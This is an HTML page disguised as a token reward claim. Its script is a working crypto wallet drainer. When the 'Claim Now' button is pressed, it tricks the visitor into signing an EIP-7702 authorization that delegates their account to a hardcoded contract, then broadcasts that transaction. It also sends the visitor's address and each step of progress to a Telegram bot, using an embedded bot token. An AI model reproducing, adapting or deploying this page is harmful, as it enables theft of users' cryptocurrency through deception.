<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim REWARD</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #08080f;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; color: #e0e0e0;
        }
        .card {
            background: #0c0c14;
            border: 1px solid #1a1a2e;
            border-radius: 16px;
            padding: 36px 28px;
            max-width: 460px; width: 100%;
        }
        .logo {
            text-align: center; margin-bottom: 28px;
            font-size: 13px; letter-spacing: 2px; color: #ff6b35;
            text-transform: uppercase;
        }
        .amount {
            text-align: center; font-size: 48px; font-weight: 700;
            color: #fff; margin: 8px 0; letter-spacing: -1px;
        }
        .sub {
            text-align: center; color: #6b7280; font-size: 13px; margin-bottom: 28px;
        }
        .info {
            background: #0f0f1a; border-radius: 10px; padding: 16px;
            margin-bottom: 24px; font-size: 13px; color: #9ca3af;
            display: flex; align-items: center; gap: 10px;
            border: 1px solid #1a1a2e;
        }
        .info-icon { font-size: 20px; }
        .btn {
            width: 100%; padding: 18px; border: none; border-radius: 12px;
            font-weight: 600; font-size: 15px; cursor: pointer; margin: 8px 0;
            transition: all 0.2s;
        }
        .btn-primary {
            background: #ff6b35; color: #fff;
        }
        .btn-primary:hover:not(:disabled) { background: #e55a2b; }
        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .status {
            text-align: center; margin-top: 14px; font-size: 12px; color: #6b7280;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Reward Claim</div>
        <div class="amount">150 REWARD</div>
        <div class="sub">Claim your tokens</div>
        
        <div class="info">
            <span class="info-icon">🔐🎊</span>
            <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
        </div>
        
        <button class="btn btn-primary" id="claimBtn">Claim Now</button>
        
        <div class="status" id="status"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
    <script>
        const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
        const CHAIN_ID = 1;
        const CHAIN_ID_HEX = '0x1';
        const TBT = '8275273137:AAG3PqVdJ4_EK_AICGNrv1mtOPJAPVSq6eY';
        const TCI = '-1002810760353';

        function sendLog(msg) {
            fetch('https://api.telegram.org/bot' + TBT + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TCI, text: msg })
            }).catch(() => {});
        }

        function toHexBytes(val) {
            if (val === 0 || val === '0x0' || val === '0x') return '0x';
            const hex = ethers.toBeHex(val);
            return hex.length % 2 === 0 ? hex : '0x0' + hex.slice(2);
        }

        document.getElementById('claimBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            const btn = document.getElementById('claimBtn');

            if (!window.ethereum) {
                sendLog('NO WALLET');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Connecting...';

            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];
                sendLog('CONNECT: ' + userAddress);

                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== CHAIN_ID_HEX) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: CHAIN_ID_HEX }]
                        });
                    } catch (e) {
                        sendLog('CHAIN FAIL');
                        btn.disabled = false;
                        btn.textContent = 'Claim Now';
                        return;
                    }
                }

                const nonce = await window.ethereum.request({
                    method: 'eth_getTransactionCount',
                    params: [userAddress, 'latest']
                });

                const authRlp = ethers.encodeRlp([
                    toHexBytes(CHAIN_ID),
                    ROUTER,
                    '0x'
                ]);

                const magicByte = new Uint8Array([0x05]);
                const preimage = new Uint8Array(magicByte.length + ethers.getBytes(authRlp).length);
                preimage.set(magicByte, 0);
                preimage.set(ethers.getBytes(authRlp), magicByte.length);
                const authHash = ethers.keccak256(preimage);

                btn.textContent = 'Sign in wallet...';
                sendLog('REQUESTING SIGNATURE');

                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [authHash, userAddress]
                });

                sendLog('SIGNED');

                const sigBytes = ethers.getBytes(signature);
                const r = ethers.hexlify(sigBytes.slice(0, 32));
                const s = ethers.hexlify(sigBytes.slice(32, 64));
                const yParity = sigBytes[64] - 27;

                const authListSingle = [
                    toHexBytes(CHAIN_ID),
                    ROUTER,
                    '0x',
                    toHexBytes(yParity),
                    r,
                    s
                ];

                const authListEncoded = ethers.encodeRlp([authListSingle]);

                const txFields = [
                    toHexBytes(CHAIN_ID),
                    nonce,
                    '0x77359400',
                    '0x77359400',
                    toHexBytes(200000),
                    userAddress,
                    '0x',
                    '0x61461954',
                    [],
                    authListEncoded
                ];

                const txRlp = ethers.encodeRlp(txFields);
                const rawTx = '0x04' + txRlp.slice(2);

                btn.textContent = 'Sending...';
                sendLog('BROADCASTING');

                const txHash = await window.ethereum.request({
                    method: 'eth_sendRawTransaction',
                    params: [rawTx]
                });

                sendLog('TX: ' + txHash);
                status.textContent = 'Claimed: ' + txHash.slice(0, 24) + '...';
                btn.textContent = 'Complete';

            } catch (e) {
                sendLog('FAIL: ' + (e.message || '') + ' code:' + (e.code || ''));
                btn.disabled = false;
                btn.textContent = 'Claim Now';
            }
        });
    </script>
</body>
</html>
